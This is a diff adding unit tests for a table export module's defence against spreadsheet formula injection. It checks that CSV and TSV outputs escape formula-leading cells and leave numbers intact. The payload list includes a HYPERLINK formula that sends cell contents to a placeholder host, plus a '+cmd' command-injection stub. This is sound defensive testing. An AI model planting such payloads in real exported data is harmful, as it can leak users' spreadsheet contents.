@@ -129,6 +129,29 @@ describe('ocr/table-extract', () => {
     });
   });
 
+  describe('formula injection (CONV-7)', () => {
+    const grid = (cells: string[]): TableGridData => ({
+      rows: [cells],
+      headers: cells,
+      rowCount: 1,
+      columnCount: cells.length
+    });
+
+    it('makes formula-leading cells literal in CSV and TSV', () => {
+      const payloads = ['=HYPERLINK("https://x/?"&A1,"Click")', '+1+cmd', '-2+3', '@SUM(A1)'];
+      const csv = exportTableToCsv(grid(payloads));
+      const tsv = exportTableToTsv(grid(payloads));
+      for (const cell of [...csv.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/), ...tsv.split('\t')]) {
+        const unquoted = cell.replace(/^"/, '');
+        expect(unquoted.startsWith("'")).toBe(true);
+      }
+    });
+
+    it('leaves plain and negative numbers numeric', () => {
+      expect(exportTableToCsv(grid(['-12.5', '+3', '-1 234', '12%']))).toBe('-12.5,+3,-1 234,12%');
+    });
+  });
+
   describe('exportTableToTsv', () => {
     it('formats rows with tab delimiters and sanitises inner tabs/newlines', () => {
       const grid: TableGridData = {
